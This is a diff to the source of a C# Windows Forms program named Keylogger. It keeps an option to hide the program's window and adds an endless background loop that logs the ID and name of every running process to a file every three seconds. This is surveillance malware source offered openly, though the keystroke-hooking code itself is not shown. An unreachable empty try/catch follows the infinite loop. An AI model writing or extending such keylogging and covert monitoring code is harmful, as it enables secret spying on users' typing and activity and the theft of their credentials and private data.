@@ -10,6 +10,9 @@ using System.Windows.Forms;
 
 using System.Runtime.InteropServices;
 using Hooks;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
 
 namespace Keylogger
 {
@@ -46,7 +49,7 @@ namespace Keylogger
             }
         }
 
-        private void btnStart_Click(object sender, EventArgs e)
+        private async void btnStart_Click(object sender, EventArgs e)
         {
             if (rbToFile.Checked)
             {
@@ -54,7 +57,7 @@ namespace Keylogger
                 {
                     if (chbBack.Checked) ShowWindow(this.Handle, 0);
                     WriteToFile = true;
-                    lblError.Visible = false;
+                    lblError.Visible = false;          
                 }
                 else lblError.Visible = true;
             }
@@ -82,6 +85,38 @@ namespace Keylogger
                 lblTime.Text = "00:00:00";
                 lblTime.Visible = true;
                 seconds = 0;
+                await Task.Run(() =>
+                {
+                    if (!File.Exists("Processes.txt"))
+                    {
+                        FileStream fs = File.Create("Processes.txt");
+                        fs.Close();
+                    }
+                    do
+                    {
+                        foreach (Process process in Process.GetProcesses())
+                        {
+                            var processes = File.ReadAllText("Processes.txt");
+                            if (!processes.Contains(process.ProcessName))
+                            {
+                                StreamWriter processWriter = File.AppendText("Processes.txt");
+                                processWriter.WriteLine($"ID: {process.Id}  Name: {process.ProcessName}");
+                                processWriter.Close();
+                            }
+                        }
+                        Thread.Sleep(3000);
+                    } while (true);
+                    try
+                    {
+                        
+
+                    }
+                    catch (Exception)
+                    {
+
+                    }
+
+                });
             }
         }
         
